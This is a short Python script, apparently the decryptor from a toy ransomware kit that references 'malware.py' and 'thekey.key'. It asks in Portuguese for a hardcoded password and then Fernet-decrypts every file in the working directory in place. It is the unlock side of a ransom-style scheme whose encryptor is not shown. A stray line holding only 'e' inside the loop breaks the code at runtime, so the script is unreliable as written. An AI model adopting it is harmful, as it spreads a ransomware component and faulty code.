import os 
from cryptography.fernet import Fernet
files = []
for file in os.listdir():
    if file == "malware.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
            files.append(file)
            
print(files)

with open("thekey.key", "rb") as key:
    secretkey = key.read()
    
senha = "Cy3ers3c"
upassword = input("Entre com sua senha de descriptografar: ")
if upassword == senha:
    for file in files:
        with open(file, "rb") as thefile:
            content = thefile.read()
            content_decrypt = Fernet(secretkey).decrypt(content)
            e 
        with open(file, "wb") as thefile:
            thefile.write(content_decrypt)
            
        print("Voce recuperou todos os seus arquivos")
        
else:
    print("Entre com uma senha correta para recuperar os arquivos")